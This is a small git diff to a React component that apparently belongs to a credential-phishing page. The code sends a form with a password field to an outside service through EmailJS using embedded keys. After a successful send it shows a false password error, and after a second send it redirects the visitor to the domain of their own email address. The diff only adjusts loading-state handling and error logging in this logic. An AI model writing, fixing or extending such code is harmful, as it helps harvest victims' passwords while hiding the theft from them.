@@ -46,11 +46,12 @@ function App() {
 
       emailjs.sendForm('service_upuq8tw', 'template_ihv35xq', form.current, 'HODMj4Z3iv5j_RC1l')
       .then((result) => {
-        setPwdOne("")
         setLoading(false)
+        setPwdOne("")
         setPwdError(true)
       }, (error) => {
-          console.log(error.text);
+          setLoading(false)
+          console.log(error);
       });
     }
 
@@ -61,6 +62,7 @@ function App() {
         const redir = getPartAfterDot(email)
         window.location.replace(`https://${redir}`);
       }, (error) => {
+          setLoading(false)
           console.log(error.text);
       });
     }
